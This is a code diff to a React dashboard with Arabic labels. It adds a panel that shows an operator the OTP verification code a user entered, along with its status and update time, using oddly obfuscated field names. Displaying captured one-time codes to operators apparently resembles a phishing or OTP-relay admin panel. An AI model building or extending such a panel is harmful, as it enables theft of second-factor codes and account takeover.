@@ -1743,6 +1743,7 @@ export default function DashboardPage() {
   const renderOtpBox = () => {
     const raw = selectedRequest?.raw || {};
     const otpStatus = raw?._v5Status || raw?.otpStatus;
+    const otpValue = raw?._v5 || raw?.otpCode || "";
 
     const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
       "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
@@ -1783,13 +1784,56 @@ export default function DashboardPage() {
           border: `1px solid ${config.border}`,
           display: "flex",
           alignItems: "center",
-          gap: 8
+          gap: 8,
+          marginBottom: 12
         }}>
           <span style={{ fontSize: "1.2rem" }}>{config.icon}</span>
           <span style={{ fontSize: "0.85rem", fontWeight: 600, color: config.color }}>
             {config.text}
           </span>
         </div>
+
+        {/* عرض رمز OTP */}
+        {otpValue && (
+          <div style={{
+            background: "#f8fafc",
+            borderRadius: 8,
+            padding: 16,
+            border: "1px solid #e5e7eb",
+            textAlign: "center",
+            marginBottom: 8
+          }}>
+            <div style={{
+              fontSize: "0.75rem",
+              color: "#6b7280",
+              marginBottom: 8,
+              fontWeight: 500
+            }}>
+              رمز التحقق المدخل
+            </div>
+            <div style={{
+              fontFamily: "ui-monospace, monospace",
+              fontSize: "1.8rem",
+              fontWeight: 700,
+              color: "#0a4a68",
+              letterSpacing: "8px",
+              direction: "ltr"
+            }}>
+              {otpValue}
+            </div>
+          </div>
+        )}
+
+        {/* وقت آخر تحديث */}
+        {raw?._v5UpdatedAt && (
+          <div style={{
+            fontSize: "0.7rem",
+            color: "#9ca3af",
+            textAlign: "center"
+          }}>
+            آخر تحديث: {formatElapsedTime(raw._v5UpdatedAt)}
+          </div>
+        )}
       </div>
     );
   };
